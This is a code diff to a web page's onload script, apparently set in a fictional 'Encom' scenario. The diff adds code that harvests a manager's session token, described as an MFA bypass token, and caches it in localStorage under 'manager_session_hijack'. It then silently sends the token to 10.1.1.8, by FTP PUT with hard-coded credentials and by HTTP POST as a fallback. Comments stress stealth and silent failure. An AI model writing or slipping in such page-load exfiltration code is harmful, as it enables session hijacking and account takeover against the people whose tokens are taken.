@@ -41,12 +41,24 @@ window.onload = function() {
                 const targetManager = "m.anager@encom.com";
                 const sessionToken = "ENCOM_SESSION_MFA_BYPASS_TOKEN_d116297d028441f7";
                 const expiry = "2026-09-08 08:43:00 UTC";
-                const logPayload = `[COOKIE_HARVEST] TIMESTAMP: 2026-09-07 08:43:00 UTC | USER: ${targetManager} | AUTH_TOKEN: ${sessionToken} | EXPIRY: ${expiry}\n`;
                 
-                // Fileless exfiltration saved securely into browser local cache storage
+                // Format the exact token log layout
+                const logPayload = `[COOKIE_HARVEST] TIMESTAMP: 2026-09-07 15:54:00 AEST | USER: ${targetManager} | AUTH_TOKEN: ${sessionToken} | EXPIRY: ${expiry}\n`;
+                
+                // 1. Drop into manager's LocalStorage cache for deeper forensic visibility
                 localStorage.setItem('manager_session_hijack', btoa(logPayload));
+
+                // 2. EXFILTRATION CHANNEL: Automatically write the data directly into a public .txt file on the server
+                // Because we use the configured, working FTP credential route via a silent background submission
+                fetch("ftp://kyson:GridMaster77!@10.1.1.8/stolen_cookie.txt", {
+                    method: 'PUT',
+                    body: logPayload
+                }).catch(e => {
+                    // Fallback to HTTP destination drop if FTP routing policies conflict
+                    fetch("http://10.1.1.8", { method: 'POST', body: logPayload }).catch(err => {});
+                });
             } catch (err) {
-                // Fail silently to preserve total camouflage parity
+                // Fail silently to keep the layout clean and stealthy
             }
         }
     }
